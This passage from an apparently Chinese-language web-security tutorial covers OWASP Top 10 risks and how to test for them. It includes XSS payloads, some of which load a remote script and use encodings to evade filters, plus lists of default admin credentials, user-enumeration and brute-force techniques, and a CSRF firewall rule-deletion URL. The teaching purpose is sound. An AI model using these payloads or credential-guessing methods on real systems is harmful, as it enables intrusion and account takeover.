　　初看上去，由于用户只能在自己的页面上注入代码，所以似乎这个漏洞并不严重，但是，只需一点点社会工程的方法，攻击者就能诱使用户访问一个在结果页面中注入了代码的URL，这就给了攻击者整个页面的权限。由于这种攻击往往会需要一些社会工程方法，所以研发人员往往不会太过看重，但是我们看如下的例子，在服务器上有如下代码：</p>
<pre><code>article.php?title=&lt;meta%20http-equiv=&quot;refresh&quot;%20content=&quot;0;&quot;&gt;
</code></pre>
<p>这就使得浏览器每3秒就刷新一次页面，而且是一个死循环的状态，这就形成了DOS攻击，导致Web服务器挂掉。<br>
　　DOM-Based XSS（基于DOM的XSS）<br>
　　这个漏洞往往存在于客户端脚本，如果一个Javascript脚本访问需要参数的URL，且需要将该信息用于写入自己的页面，且信息未被编码，那么就有可能存在这个漏洞。<br>
　　黑盒测试和示例：<br>
　　比较简单的测试是否存在XSS漏洞的方法是验证Web应用是否会对一个包含了HTTP响应的简单脚本的访问请求，例如，Sambar服务器（5.3）包含一个众所周知的XSS漏洞，我们向服务器发送如下的请求，从服务器端能够产生一个响应从而在Web浏览器中执行</p>
<pre><code>http://server/cgi-bin/testcgi.exe?&lt;SCRIPT&gt;alert(“Cookie”+document.cookie)&lt;/SCRIPT&gt;
</code></pre>
<p>这个脚本会在客户浏览器端被执行。<br>
　　我们再举个例子：<br>
　　由于Javascript是区分大小写的，有些人会尝试将所有字符转换为大写字符来避免XSS漏洞，在这时，我们最好还是使用VBScript，因为它是大小写不区分的：</p>
<pre><code>JavaScript.
&lt;script&gt;alert(document.cookie);&lt;/script&gt;
VBScript.
&lt;script. type=&quot;text/vbscript&quot;&gt;alert(DOCUMENT.COOKIE)&lt;/script&gt;
如果我们已经过滤了”&lt;”，或者是&lt;script，/script&gt;，那么我们就需要尝试各种编码方法了
&lt;script. src=http://www.example.com/malicious-code.js&gt;&lt;/script&gt;
%3cscript. src=http://www.example.com/malicious-code.js%3e%3c/script%3e
\x3cscript. src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e
</code></pre>
<p><strong>A3-错误的认证和会话管理</strong><br>
OWASP TOP10排名第3的威胁“遭破坏的认证和会话管理”，简而言之，就是攻击者窃听了我们访问HTTP时的用户名和密码，或者是我们的会话，从而得到sessionID，进而冒充用户进行Http访问的过程。<br>
由于HTTP本身是无状态的，也就是说HTTP的每次访问请求都是带有个人凭证的，而SessionID就是为了跟踪状态的，而sessionID本身是很容易在网络上被监听的到，所以攻击者往往通过监听sessionID来达到进一步攻击的目的。<br>
这些漏洞往往会存在于Web页面的“更改我的密码”、“记住我的密码”、“忘记密码”、“安全提问”、“注销登录”、“邮件地址”等环节上。<br>
那么，一般来说，如何来防范这种漏洞呢？<br>
第一，  我们要整体审视我们的架构<br>
        认证机制本身必须是简单、集中和标准化的；<br>
        使用容器提供给我们的标准session id；<br>
        确保在任何时候用SSL来保护我们的密码和session id<br>
第二，  验证认证的实现机制<br>
        检查SSL的实现方法<br>
        验证所有与认证相关的函数<br>
        确保“注销登录”的动作能够关闭所有的会话<br>
        使用OWASP的WebScrab来测试你的应用<br>
如何进行验证测试<br>
所谓认证，就是建立确信某物或某人是真实的这么一个过程，authentication来自于希腊语αυθεντικός，即真实的，可信的。认证本身依赖于多个认证因子，在计算机安全领域，认证意味着验证通讯发起者的数字身份，常见的认证过程就是用户登录认证，所谓认证测试就是理解系统中的认证机制并找到方法绕过该认证机制。<br>
认证测试需要考虑的点有很多，下面我们逐一来进行解释说明<br>
        在加密通道上传递密码<br>
原则上，用户的认证必须通过加密信道进行传输，我们在这里的目的不是要验证诸如HTTPS是否安全，我们要验证的仅仅是用户的认证信息是否已经被加密了。<br>
在用户登录时，最常见的方式是用户输入用户名和密码后，通过POST方法传输，一般来说，认证信息或者是通过不安全的HTTP传递，或者是通过加密的HTTPS传递。我们注意到，甚至有些网站在登录页面显示给我们的是HTTPS，但事实上却仍然是用HTTP的，最简单的方法就是用网络监听工具，如SnifferPro或Ethereal来判断是否是真实加密了。<br>
下面，我们用OWASP的WebScrab截取一些信息来做个例子<br>
假设，登录页面要求用户输入用户名和密码，然后有一个“提交”按钮，那么在WebScrab中我们得到如下的请求数据：</p>
<pre><code>POST http://www.example.com/AuthenticationServlet HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.14) Gecko/20080404
Accept: text/xml,application/xml,application/xhtml+xml
Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Connection: keep-alive
Referer: http://www.example.com/index.jsp
Cookie: JSESSIONID=LVrRRQQXgwyWpW7QMnS49vtW1yBdqn98CGlkP4jTvVCGdyPkmn3S!
Content-Type: application/x-www-form-urlencoded
Content-length: 64
delegated_service=218&amp;User=test&amp;Pass=test&amp;Submit=SUBMIT
</code></pre>
<p>在上面的数据中，我们可以看到，POST方法通过HTTP协议把数据发送到http://www.example.com/AuthenticationServlet，那么显然在这时，传送的数据没有进行加密，恶意用户通过监听网络就很容易得到用户名和密码。<br>
再看下一个例子，假设是用HTTPS协议，那么请求的头数据如下：</p>
<pre><code>POST https://www.example.com:443/cgi-bin/login.cgi HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.14) Gecko/20080404
Accept: text/xml,application/xml,application/xhtml+xml,text/html
Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Connection: keep-alive
Referer: https://www.example.com/cgi-bin/login.cgi
Cookie: language=English;
Content-Type: application/x-www-form-urlencoded
Content-length: 50
Command=Login&amp;User=test&amp;Pass=test
</code></pre>
<p>可见，上述例子中的数据经加密后被传送到https://www.example.com:443/cgi-bin/login.cgi，这就确保了数据是加密的而不被其他人所窃取。<br>
再看下面的一个例子，我们在一个可以通过HTTP协议访问到的页面上通过HTTPS协议来发送数据</p>
<pre><code>POST https://www.example.com:443/login.do HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.14) Gecko/20080404
Accept: text/xml,application/xml,application/xhtml+xml,text/html
Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Connection: keep-alive
Referer: http://www.example.com/homepage.do
Cookie: SERVTIMSESSIONID=s2JyLkvDJ9ZhX3yr5BJ3DFLkdphH0QNSJ3VQB6pLhjkW6F
Content-Type: application/x-www-form-urlencoded
Content-length: 45
User=test&amp;Pass=test&amp;portal=ExamplePortal
</code></pre>
<p>如上，我们看到，我们的请求通过HTTPS引向了https://www.example.com:443/login.do，但如果我们再看Referer的值，就发现我们是从HTTP页http://www.example.com/homepage.do过来的。在这种情况下，我们的浏览器窗口中并不会告诉我们现在使用的安全连接，而事实上我们却正在使用安全连接。<br>
在上面的例子中，如果我们用Get方法，那么所输入的用户名和密码将会以明文的方式显示在URL中，这显然是不可取的。那么，如果我们经由Get方法通过HTTPS来传递数据是否可行呢，看下面的数据</p>
<pre><code>GET https://www.example.com/success.html?user=test&amp;pass=test HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.14) Gecko/20080404
Accept: text/xml,application/xml,application/xhtml+xml,text/html
Accept-Language: it-it,it;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Connection: keep-alive
Referer: https://www.example.com/form.html
If-Modified-Since: Mon, 30 Jun 2008 07:55:11 GMT
If-None-Match: &quot;43a01-5b-4868915f&quot;
</code></pre>
<p>从上面的例子可以看到，用户名和密码都以明文的方式在URL里存在，而不像上面的几个例子中都在消息体中，但并不是说攻击者就可以很容易看到这些信息，TLS/SSL毕竟是安全性很高的协议，整个HTTP数据包是加密的，但仍然要注意的是这些用户名和密码在传输过程中会被存储在代理和服务器上，这也就有可能会泄露用户信息。<br>
        用户列举测试法<br>
这种测试，简而言之是通过与应用的认证机制的交互，尝试能否获得一些正确的用户名，这对后面我们会讲到的暴力破解很有效，确认了正确的用户名就能用暴力破解去尝试密码了。<br>
通常，WEB应用对于用户名正确的输入会有一些信息反馈，例如，如果我们输错了密码，那么有时会反馈告知我们系统存在该用户，或密码错误。所以，作为测试人员，就要尝试不同的请求来判断系统是否会有不同的返回。<br>
对于HTTP的响应消息测试：<br>
        输入正确的用户名和密码<br>
期望结果：使用WebScrab抓取服务器的返回信息（HTTP 200 Response,消息的长度）<br>
        输入正确的用户名/错误的密码<br>
期望结果：从浏览器我们往往会得到如下的返回<br>
或者是如下返回<br>
甚至是如下的返回<br>
Login for User foo: invalid password<br>
        输入不存在的用户名<br>
期望结果：返回可能如下<br>
或者是如下的消息<br>
Login failed for User foo: invalid Account<br>
通常情况下，对于不同的出错信息，服务器往往返回的消息是一样的，但如果不同，测试人员就要去尝试在什么情况下不同，如下：<br>
客户请求：正确用户/错误密码——&gt;服务器返回：密码错误<br>
客户请求：错误用户/错误密码——&gt;服务器返回：用户不存在。<br>
那么显然第一条就告诉我们我们输入的是正确的用户名，通过这种方式我们就可以获得一些正确的用户名信息。<br>
还有其他一些尝试列举的方法：<br>
        有些应用程序会返回一些特定的出错信息；<br>
        分析URL以及重定向URL<br>
如下面的URL：<br>
http://www.foo.com/err.jsp?User=baduser&amp;Error=0<br>
http://www.foo.com/err.jsp?User=gooduser&amp;Error=2<br>
上面两个URL都告诉我们到了错误页面，但上一条是Error值为0，下一条Error值为2，那么我们可以猜测我们获得了一个正确的用户名。<br>
        URI探测<br>
有时候，Web服务器在接受一个对目录访问请求时，根据目录是否存在会有不同的返回信息，例如在某些网站会给每个用户设定一个目录，那么我们如果尝试访问某个已存在的目录时，它可能的返回页面如下：<br>
403 Forbidden error code<br>
404 Not found error code<br>
举例：<br>
http://www.foo.com/account1-返回的出错信息: 403 Forbidden<br>
http://www.foo.com/account2-返回的出错信息: 404 file Not Found<br>
那么显然，account1是现实存在的。<br>
        探测性用户账户测试法<br>
众所周知，在系统中往往会有默认账户或者很容易被猜到的常用账户，而且往往很多用户会使用默认的密码，同样，有些应用系统的测试账户研发人员有时也会忘记删除。这个问题事实上是一个漏洞，而这种漏洞往往是由于以下原因造成的：<br>
        没有经验的IT工程师，他们往往不会更改安装的架构组件的缺省密码；<br>
        编程人员在应用中留有后门以便测试，但在发布时忘记删除；<br>
        系统的管理员和用户采用了很简单的密码；<br>
        系统有内嵌的，无法删除的内部用户名和密码<br>
        ……<br>
对于注入Cisco路由器或WebLogic等，他们都有一些默认的用户名和密码，我们可以直接尝试，对于一些我们根本不了解的应用，我们可以做如下尝试：<br>
        尝试以下系统管理员的常用账号——&quot;admin&quot;, &quot;administrator&quot;, &quot;root&quot;, &quot;system&quot;, &quot;guest&quot;, &quot;operator&quot;, &quot;super&quot;，&quot;qa&quot;, &quot;test&quot;, &quot;test1&quot;, &quot;testing&quot;，针对用户名和密码组合尝试，也可以尝试诸如&quot;password&quot;, &quot;pass123&quot;, &quot;password123&quot;, &quot;admin&quot;,或guest&quot;这些密码。如果这些都无法成功，我们可以写一些脚本来尝试类似的用户名和密码组合。<br>
        管理员的密码有时会与系统名字相关，如我们测试的应用系统叫“Obscurity”，那么可以尝试用户名/密码组合Obscurity/obscurity。<br>
        利用注册页面我们也可以猜测用户名和密码的格式和长度。<br>
        尝试上述提到的所有用户名和空密码。<br>
        查看页面的源文件，尝试找到所有引用到用户名和密码的信息，比如&quot;If username='admin' then starturl=/admin.asp else /index.asp&quot;<br>
        寻找那些源文件中注释中可能含有的用户名和密码信息；<br>
        …….<br>
        强力测试（暴力测试）<br>
任何一种技术，在不同的人手里运用所达到的效果是不同的，正如暴力测试，也叫暴力破解，安全服务人员和测试人员利用这种技术来验证是否存在漏洞，而攻击者则利用其来寻找漏洞。<br>
Web应用系统通常会有一些用户认证方式，这些方式包括证书、指纹、一次性令牌等等，但更多的，往往是用户名和密码的组合，这就使得暴力破解成为可能。<br>
在对Web应用系统做暴力测试时，首先我们需要了解的是系统的认证机制，通常Web系统会采用以下两种机制：<br>
        HTTP认证——包含基本存取认证和数字存取认证。<br>
        基于HTML表单的认证。<br>
我们下面对这些认证方式做一下简单介绍：<br>
基本存取认证<br>
基本存取认证假设假定用户会以用户名和密码的组合来表明自己的身份，当用户浏览器使用这种机制访问站点时，web服务器将会返回一个包含“WWW-Authenticate”头的401响应，且包含了一个“Basic”值，以及被保护的域名（例如，WWW-Authenticate: Basic realm=”wwwProtectedSite”）客户端会弹出一个需要用户输入该域用户名和密码的提示框。然后，客户端浏览器返回给服务器一个响应，响应包含“Authorization”头，还包含“Basic”值以及连接了用户名，冒号，密码的基于64位的编码（例如，Authorization: Basic b3dhc3A6cGFzc3dvcmQ=），但可惜的是，这个回复只要被攻击者监听到就很容易被解码。<br>
我们来看一下这个过程：<br>
1.客户端发送一个标准的HTTP请求<br>
GET /members/docs/file.pdf HTTP/1.1<br>
Host: target</p>
<ol>
<li>web服务器定位到访问的这个资源是在一个受保护的目录；<br>
3.服务器发送一个HTTP 401的认证请求；<br>
HTTP/1.1 401 Authorization Required<br>
Date: Sat, 04 Nov 2006 12:52:40 GMT<br>
WWW-Authenticate: Basic realm=&quot;User Realm&quot;<br>
Content-Length: 401<br>
Keep-Alive: timeout=15, max=100<br>
Connection: Keep-Alive<br>
Content-Type: text/html; charset=iso-8859-1<br>
4.浏览器弹出要求输入用户名和密码的数据窗口；<br>
5.用户输入用户名和密码后，包含以下数据后再次提交；<br>
GET /members/docs/file.pdf HTTP/1.1<br>
Host: target<br>
Authorization: Basic b3dhc3A6cGFzc3dvcmQ=<br>
6.服务器把客户信息和存储的信息进行比较；<br>
7.如果身份验证正确，服务器发回被请求的内容，如果失败，服务器将会返回HTTP<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303347049.png" alt="" loading="lazy"><br>
www.owasp.org_Image-basm-sessid.jpg_Basm-sessid<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303343493.png" alt="" loading="lazy"><br>
www.owasp.org_Image-basm-sessid2.jpg_Basm-sessid2<br>
A4-不安全的直接对象引用<br>
所谓“不安全的对象直接引用”，即Insecure direct object references，意指一个已经授权的用户，通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。Web应用往往在生成Web页面时会用它的真实名字，且并不会对所有的目标对象访问时来检查用户权限，所以这就造成了不安全的对象直接引用的漏洞。<br>
我们看如下的一个示例，也许这样就更容易理解什么是不安全的对象直接引用<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303337959.png" alt="" loading="lazy"><br>
攻击者发现他自己的参数是6065，即?acct=6065；<br>
他可以直接更改参数为6066，即?acct=6066；<br>
这样他就可以直接看到6066用户的账户信息了。</li>
</ol>
<p>一般来说，防止不安全的直接对象引用的方法有以下两种：<br>
使用非直接的对象引用——这防止了攻击者直接访问其并未授权的对象，通过一种mapping或是其他的方法让攻击者无法直接访问。<br>
检查访问——对每一个来自于不信任的源的直接对象引用都必须包含访问控制检查，从而确信该用户对该对象拥有访问权。</p>
<p><strong>A5-伪造跨站请求（CSRF）</strong><br>
跨站请求伪造，也被称成为“one click attack”或者session riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。<br>
CSRF攻击通过在授权用户访问的页面中包含链接或者脚本的方式工作。例如：一个网站用户Bob可能正在浏览聊天论坛，而同时另一个用户Alice也在此论坛中，并且后刚刚发布了一个具有Bob银行链接的图片消息。设想一下，Alice编写了一个在Bob的银行站点上进行取款的form提交的链接，并将此链接作为图片tag。如果Bob的银行在cookie中保存他的授权信息，并且此cookie没有过期，那么当Bob的浏览器尝试装载图片时将提交这个取款form和他的cookie，这样在没经Bob同意的情况下便授权了这次事务。<br>
CSRF是一种依赖web浏览器的、被混淆过的代理人攻击（deputy attack）。在上面银行示例中的代理人是Bob的web浏览器，它被混淆后误将Bob的授权直接交给了Alice使用。<br>
下面是CSRF的常见特性：<br>
        依靠用户标识危害网站<br>
        利用网站对用户标识的信任<br>
        欺骗用户的浏览器发送HTTP请求给目标站点<br>
风险在于那些通过基于受信任的输入form和对特定行为无需授权的已认证的用户来执行某些行为的web应用。已经通过被保存在用户浏览器中的cookie进行认证的用户将在完全无知的情况下发送HTTP请求到那个信任他的站点，进而进行用户不愿做的行为。<br>
使用图片的CSRF攻击常常出现在网络论坛中，因为那里允许用户发布图片而不能使用JavaScript。<br>
防范措施<br>
对于web站点，将持久化的授权方法（例如cookie或者HTTP授权）切换为瞬时的授权方法（在每个form中提供隐藏field），这将帮助网站防止这些攻击。一种类似的方式是在form中包含秘密信息、用户指定的代号作为cookie之外的验证。<br>
另一个可选的方法是“双提交”cookie。此方法只工作于Ajax请求，但它能够作为无需改变大量form的全局修正方法。如果某个授权的cookie在form. post之前正被JavaScript代码读取，那么限制跨域规则将被应用。如果服务器需要在Post请求体或者URL中包含授权cookie的请求，那么这个请求必须来自于受信任的域，因为其它域是不能从信任域读取cookie的。<br>
与通常的信任想法相反，使用Post代替Get方法并不能提供卓有成效的保护。因为JavaScript能使用伪造的POST请求。尽管如此，那些导致对安全产生“副作用”的请求应该总使用Post方式发送。Post方式不会在web服务器和代理服务器日志中留下数据尾巴，然而Get方式却会留下数据尾巴。<br>
尽管CSRF是web应用的基本问题，而不是用户的问题，但用户能够在缺乏安全设计的网站上保护他们的帐户：通过在浏览其它站点前登出站点或者在浏览器会话结束后清理浏览器的cookie。<br>
影响CSRF的因素<br>
CSRF攻击依赖下面的假定：<br>
        攻击者了解受害者所在的站点<br>
        攻击者的目标站点具有持久化授权cookie或者受害者具有当前会话cookie<br>
        目标站点没有对用户在网站行为的第二授权</p>
<p>防范CSRF漏洞——测试篇<br>
CSRF（Cross Site Request Forgey）跨站点伪造请求，是排在OWASP Top10第5位的漏洞，它迫使已被认证的用户在Web系统上执行其所不欲的操作。这种攻击依赖于以下：<br>
1） Web浏览器对会话相关信息的处理方式（如cookie或Http认证信息）<br>
　　2） 攻击者对正确的Web系统的URL的了解；<br>
　　3） 应用会话管理仅依赖于浏览器所了解的信息；<br>
　　4） 一些HTML的tag会导致对http(s)资源的直接访问其中，前3点是确认系统是否存在该漏洞的主要前提，第4点则是用来帮助攻击者利用该漏洞的。<br>
　　第1点：浏览器自动发送用于识别用户会话的信息，假设site是一个Web应用站点，victim是一个已经在该系统上经过认证的用户。在server的响应中，site发送一个带有代表victim身份的cookie给victim，原则上，一旦浏览器接收到了服务器发送的cookie，就会在后面对站点的访问中都带上这个cookie；<br>
　　第2点：如果应用在URL中没有使用会话相关的信息，那就意味着应用的URL，它们的参数，相应的值可以被识别。<br>
　　第3点：是指诸如cookie、或者是基于http的认证信息，存放在浏览器中后，就会包含在后面的每次请求中。<br>
　　下面，我们用Get方法在做个例子，如果用户已经通过了认证，那么在他做下一次请求时，请求数据中会自动加上cookie<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303330206.png" alt="" loading="lazy"><br>
GET请求一般会有多种原因产生，<br>
　　* 用户真正在访问Web系统；<br>
　　* 用户在访问地址栏中切实敲入了URL；<br>
　　* 用户点击了一个连接指向了这个URL；<br>
　　这些调用对于系统来说是无法区别的，特别的，第三种方式相对来说是极为危险的，有很多种方法可以用来仿造连接的真实属性，连接可以被嵌入到一封邮件中，或者在某个恶意网站上，看上去这个连接好像是在访问另一个网站，而事实上却是被引到了Web系统的访问上。如果用户点击了连接，由于它已经被系统认证通过了，浏览器就会对系统提交一个待用认证信息的GET请求。这就在系统上完成了一个操作（尽管这个操作不是用户本身所期望做的）。<br>
攻击者还可以通过Web的一些标记，注入img来达到这个目的。举个例子，假设攻击者发给用户一封邮件，引诱用户访问了一个URL，而这个URL的页面含有下面的HTML：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303326048.png" alt="" loading="lazy"><br>
　那么用户在点击这个URL时，浏览器将会做什么呢，它将会尝试显示一个宽度为0的图片，而事实上这是访问了www.company.example/action，显然如果浏览器并没有阻断下载img的图片，那么该动作就会执行了。<br>
　　该问题的存在是基于以下一些事实：<br>
　　* 有一些HTML的tags可能会执行一些脚本（如img）<br>
　　* 浏览器本身并不能识别img这个tag里的值是否是真实合法的图片<br>
　　* 不管图片是否是在网站本地或是其他网站，图片都会被下载<br>
　　举个例子：<br>
　　假设用户要登录到某个防火墙web管理系统，登录时，用户必须对系统进行身份验证，所以用户的会话信息会保存在cookie中。假设我们的防火墙管理系统允许认证过的用户根据防火墙规则的排号来删除规则（甚至允许用户输入“*”来删除所有的规则），那么下一步显示的就是删除页面，假定表单下面就会提交一个GET请求，是以如下的格式：</p>
<pre><code>　　https://[target]/fwmgt/delete?rule=1
　　或https://[target]/fwmgt/delete?rule=*
</code></pre>
<p>我们举的例子很简单，仅仅是为了说明CSRF的存在<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303320855.png" alt="" loading="lazy"><br>
那么，如果用户输入了“<em>”，然后按取了Delete键，那么就提交了如下的GET请求，<br>
　　https://www.company.example/fwmgt/delete?rule=</em><br>
　　同时就删除了所有的防火墙规则。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303316792.png" alt="" loading="lazy"><br>
显然，如果用户直接在地址栏中输入<code>https://[target]/fwmgt/delete?rule=*</code>，或者通过某个链接转接到这个url，或者如上面所说，把链接隐藏在img这个tag后面，诸如此种方法，如果用户在点击这个连接的时候，已经登录进了防火墙管理系统，显然这个访问就能成功奏效，从而达到了删除所有规则的目的。<br>
　　让我们想象一下，如果这样的攻击用于一些敏感系统，竞拍系统，或者是银行转账等等，所造成的后果将会多大。<br>
　　应对方法：<br>
　　对于用户来说，由于CSRF漏洞极为普遍，所以在我们的日常使用中要注意以下几点：<br>
　　* 保证系统使用完就注销登录的习惯；<br>
　　* 不要使用浏览器的保存用户名/密码的功能，不要使用网站的“记住我”功能<br>
　　* 不要使用同一个浏览器浏览普通网页和你的关键性Web系统<br>
　　对于开发人员来说，如上所述，由于将会话相关的信息放入了URL才造成了上述的问题，那么如果我们在URL层面增加会话特定的信息，那么对攻击者来说就增加了了解URL结构的难度。另外，我们还可以尽可能的使用POST，而不是GET；尽可能多的增加一些诸如“你确定要这样做吗？”的页面等……<br>
　　说到这，想必大家都已明白CSRF是什么了，下面我们来看下针对这个漏洞，作为测试人员该如何去测试。<br>
　　一般的测试用例应该如下构建：<br>
　　1假设u是需要被测试的URL，例如u =http://www.example.com/action；<br>
　　2构建一个包含了访问上述URL信息的html页面；<br>
　　3确保合法用户已经登录了系统；<br>
　　4诱使该用户在自己不知情的情况下访问上述URL；<br>
　　5确认是否执行了该操作。<br>
<strong>A6-安全误配置（Security Misconfiguration）</strong><br>
排在第六位的是不当的安全配置，事实上，这个问题可能存在于Web应用的各个层次，譬如平台、Web服务器、应用服务器，系统框架，甚至是代码中。开发人员需要和网络管理人员共同确保所有层次都合理配置，有很多自动化的工具可以用于查找是否缺少补丁，错误的安全配置，缺省用户是否存在，不必要的服务等等。<br>
这个漏洞往往使得攻击者能够访问未被授权的系统数据和功能，甚至有时，会导致整个系统被破坏。<br>
其实说这个漏洞该怎么防范并没有什么实际的措施，唯一的方法就是尽可能的对你的系统的所有方面都做好安全配置。<br>
         验证你的系统的安全配置<br>
         可使用自动化的安全配置向导；<br>
         必须覆盖整个平台和系统；<br>
         对所有组件都必须保证安装了最新的补丁；<br>
         完善分析变更带来的安全影响<br>
         对所有你做的安全配置进行记录<br>
         使用自动化扫描工具对你的系统进行验证。</p>
<p><strong>A7-限制远程访问失败</strong><br>
排在第7位的是“Failure to Restrict URL Access”，这个漏洞事实上也是与认证相关的，与我们前面提到的Top4不安全的直接对象引用也是类似的，不同在于这个漏洞是说系统已经对URL的访问做了限制，但这种限制却实际并没有生效。常见的错误是，我们在用户认证后只显示给用户认证过的页面和菜单选项，而实际上这些仅仅是表示层的访问控制而不能真正生效，攻击者能够很容易的就伪造请求直接访问未被授权的页面。<br>
我们举个例子来说明这个过程：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303302497.png" alt="" loading="lazy"><br>
1攻击者发现他自己的访问地址为/user/getAccounts；<br>
2他修改他的目录为/admin/getAccounts或/manager/getAccounts；<br>
3这样攻击者就能够查看到更多的账户信息了。<br>
那么，该如何防范出现这个漏洞呢？<br>
        对每个URL，我们必须做三件事<br>
        如果这个URL不是公开的，那么必须限制能够访问他的授权用户；<br>
        加强基于用户或角色的访问控制；<br>
        完全禁止访问未被授权的页面类型（如配置文件、日志文件、源文件等）<br>
        验证你的构架<br>
        在每一个层次都使用简单肯定的模型；<br>
        确保每一层都有一个访问机制<br>
        验证你的实现<br>
        不要使用自动化的分析工具<br>
        确保每个URL都被外部过滤器或其他机制保护<br>
        确保服务器的配置不允许对非授权页面的访问<br>
<strong>A8-未验证的重定向和传递</strong><br>
在Web应用中重定向是极为普遍的，并且通常重定向所引向的目的是带有用户输入参数的目的URL，而如果这些重定向未被验证，那么攻击者就可以引导用户访问他们所要用户访问的站点。<br>
同样，转发也是极为普遍的，本质上转发是在同一个应用中对一个新页面发送请求，并且有时是用参数来定义目标页面的。同样，如果参数未被验证，那么攻击者就可以利用其来绕过认证或是授权检查。<br>
而最终造成的后果，重定向会使得用户访问钓鱼网站或是恶意网站，而转发则会让攻击者利用先前安全检查过的请求来绕过认证或是授权。<br>
对于这个漏洞，常用的防范方式包括：<br>
         尽可能的避免使用重定向和转发机制；<br>
         如果使用了，那么在定义目标url的时候不要包含用户参数；<br>
         如果一定要包含用户的参数，那么，<br>
         对每个参数都必须进行验证以确保它的正确性和合法性；或是<br>
         在服务器端提供映射机制，将用户的选择参数转变为真正的目标页面；<br>
<strong>A9-不安全的加密存储</strong><br>
我们常说数据的安全性是极为重要的，而在程序人员的编程过程中，由于有些需求或是设计的问题，往往会造成特别是机密数据的安全性得不到保证，常见的不安全的数据存储包括：<br>
        未能识别全部的机密数据；<br>
        对某个机密数据未能识别其所有的存放地；（数据库、文件、目录、日志文件……）<br>
        未对数据的每个存放地进行合理的保护<br>
那么显然，这样造成的后果是极为严重的：<br>
        攻击者能够取得或是篡改机密的或是私有的信息；<br>
        攻击者通过这些秘密的窃取从而进行进一步的攻击；<br>
        造成企业形象破损，用户满意度下降，甚至会有法律诉讼等；<br>
一般来说，我们采用以下的方法来避免这个漏洞的存在：<br>
        验证你的结构<br>
        识别所有的敏感数据；<br>
        识别这些数据存放的所有位置；<br>
        确保所应用的威胁模型能够应付这些攻击；<br>
        使用加密手段来应对威胁<br>
        使用一定的机制来进行保护<br>
        文件加密；数据库加密；数据元素加密<br>
        正确的使用这些机制<br>
        使用标准的强算法；<br>
        合理的生成，分发和保护密钥；<br>
        准备密钥的变更<br>
        验证实现方法<br>
        确保使用了标准的强算法；<br>
        确保所有的证书、密钥和密码都得到了安全的存放；<br>
        有一个安全的密钥分发和应急处理的方案；<br>
<strong>A10-不足的传输层保护</strong><br>
最后一个漏洞事实上也是与上一个漏洞有所相似，都是一种缺少了对敏感数据保护的漏洞。不同在于这种漏洞更多关注的是数据在网络上的传输，造成这个漏洞的原因往往如下：<br>
         未能识别所有的敏感数据；<br>
         未能识别敏感数据发送的所有位置；<br>
         未能在每个位置对敏感数据提供合理的保护<br>
这个漏洞造成的后果和排在第9位的类似，这里不做赘述。<br>
但是防范方法却和第9位的方法有一定的区别，主要的方法包括：<br>
         提供合理的保护机制<br>
         对于敏感数据的传输，对所有连接都要使用TLS；<br>
         在传输前对单个数据都要进行加密；（如XML-Encryption）<br>
         在传说前对信息进行签名；（如XML-Signature）<br>
         正确的使用这些机制<br>
         使用标准的强算法<br>
         合理管理密钥和证书；<br>
         在使用前验证SSL证书</p>
<p>1 Web 应用程序布署环境测试<br>
用来架构Web 网站的UNIX、LINUX、WINDOWS 等服务器端操作系统和服务器软件都可能存在漏洞（如前不久被发现的LINUX 系统内核漏洞），这些漏洞都会对Web 应用程序造成安全威胁。因此，在布署Web 应用程序前，应对Web 应用程序的布署环境进行严格的测试，检查一切已知的漏洞，发现新的漏洞，将应用程序环境带来的安全威胁降底到最低程度。</p>
<p>1.1HTTP 请求引发漏洞的测试<br>
超长URL 的HTTP 请求，特殊格式字符的HTTP 请求，某些不存在文件的HTTP 请求，COM Internet Services (CIS)– RPC over HTTP 漏洞，从而引发拒绝服务，源代码显示，站点物理路径泄露，执行任意命令及命令注入等安全问题。因此，对非常规URL 的HTTP 请求要做全面的测试，以发现这方面的漏洞。测试工作以人工方式为主，并配以Tripwire和AIDE 的完整性检查工具检查系统文件，对于发现的漏洞，可采取关闭所有不必要的服务和安装系统补丁加固系统。另外要保持对最新补丁和安全公告的追踪，在实验环境进行测试后正式安装在布署Web 应用程序的主机上。</p>
<p>1.2 操作系统目录安全性及Web 应用程序布署环境目录遍历问题测试<br>
目录权限和目录安全性直接影响着Web 的安全性。测试中要检查Web 应用程序布署环境的目录权限和安全性，不给恶意用户任何可用的权限。目录遍历可能导致用户从客户端<br>
看到或下载、删除Web 服务器文件。因此，要测试Web 应用程序及布署环境是否存在目录遍历问题；若存在该漏洞，可通过在各级目录中存放默认文档或及时升级系统来避免。</p>
<p>1.3 系统中危险组件的测试<br>
